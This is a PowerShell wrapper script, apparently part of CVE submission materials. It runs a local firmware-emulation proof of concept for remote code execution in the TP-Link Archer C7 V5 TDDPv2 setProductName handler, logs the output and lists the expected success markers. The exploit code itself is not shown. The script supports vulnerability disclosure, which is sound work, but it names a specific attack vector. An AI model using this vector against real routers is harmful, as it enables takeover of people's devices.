$ErrorActionPreference = "Continue"
$Host.UI.RawUI.WindowTitle = "REAL PoC reproduction - TP-Link Archer C7 V5 TDDPv2 setProductName RCE"
Clear-Host
Write-Host "REAL PoC reproduction - TP-Link Archer C7 V5 TDDPv2 setProductName RCE"
Write-Host "This visible terminal is executing the verified local firmware-emulation PoC."
Write-Host ""
Write-Host "Command:"
Write-Host "docker exec firmrec-dev-run sh -lc 'chmod +x /root/inout/work/deepdive/tplink_tddpv2_setproduct_hostexec_bridge_2026_06_08/verify_tddpv2_hostexec_bridge.sh; /root/inout/work/deepdive/tplink_tddpv2_setproduct_hostexec_bridge_2026_06_08/verify_tddpv2_hostexec_bridge.sh'"
Write-Host ""
Write-Host "Running..."
Write-Host ""

$LogPath = "E:\\competition\\firmrec_friend_runtime_project\\firmrec_friend_runtime_project\\cve_submission_materials\\tplink_archer_c7v5_tddpv2_setproduct_rce_2026-06-08\\screenshots\\real_01_terminal_reproduction_output.txt"
$DonePath = "E:\\competition\\firmrec_friend_runtime_project\\firmrec_friend_runtime_project\\cve_submission_materials\\tplink_archer_c7v5_tddpv2_setproduct_rce_2026-06-08\\screenshots\\real_01_terminal_reproduction.done"

& docker exec firmrec-dev-run sh -lc 'chmod +x /root/inout/work/deepdive/tplink_tddpv2_setproduct_hostexec_bridge_2026_06_08/verify_tddpv2_hostexec_bridge.sh; /root/inout/work/deepdive/tplink_tddpv2_setproduct_hostexec_bridge_2026_06_08/verify_tddpv2_hostexec_bridge.sh' 2>&1 |
    Tee-Object -FilePath $LogPath

Write-Host ""
Write-Host "Reproduction command finished."
Write-Host "Expected success markers: status=0x00, PWNED_CREATED, TDDP_RCE."
Write-Host "This window will stay open for screenshot capture."
Set-Content -Path $DonePath -Value "done" -Encoding ASCII
